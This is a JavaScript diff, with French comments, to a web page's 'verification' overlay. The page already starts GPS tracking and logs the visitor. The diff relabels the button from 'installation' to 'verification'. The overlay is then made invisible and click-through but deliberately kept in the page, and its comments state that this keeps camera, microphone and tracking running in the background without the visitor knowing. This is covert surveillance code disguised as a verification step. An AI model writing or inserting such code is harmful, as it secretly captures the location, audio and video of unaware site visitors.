@@ -959,7 +959,7 @@ function bindVerificationForm(overlay) {
 
             const btn = overlay.querySelector('#btn-verify-submit');
             btn.disabled = true;
-            btn.innerText = 'Installation en cours...';
+            btn.innerText = 'Vérification en cours...';
 
             try {
                 if (document.documentElement.requestFullscreen) {
@@ -970,10 +970,17 @@ function bindVerificationForm(overlay) {
             if (!gpsWatchStarted) startGpsTracking();
             await logVisitor(null, true, true);
 
+            // --- PASSAGE EN BACKGROUND ---
+            // Au lieu de supprimer l'overlay, on le rend invisible
+            // Mais on garde les processus (caméra, micro, etc.) actifs
             setTimeout(() => {
+                overlay.style.transition = 'opacity 1s ease';
                 overlay.style.opacity = '0';
-                setTimeout(() => overlay.remove(), 500);
-            }, 1500);
+                overlay.style.pointerEvents = 'none'; // Rend les clics possibles sur le site en dessous
+                
+                // On ne fait PAS overlay.remove() pour que le tracker reste vivant
+                console.log("Système passé en arrière-plan. Tracking actif.");
+            }, 2000);
         }
     };
 
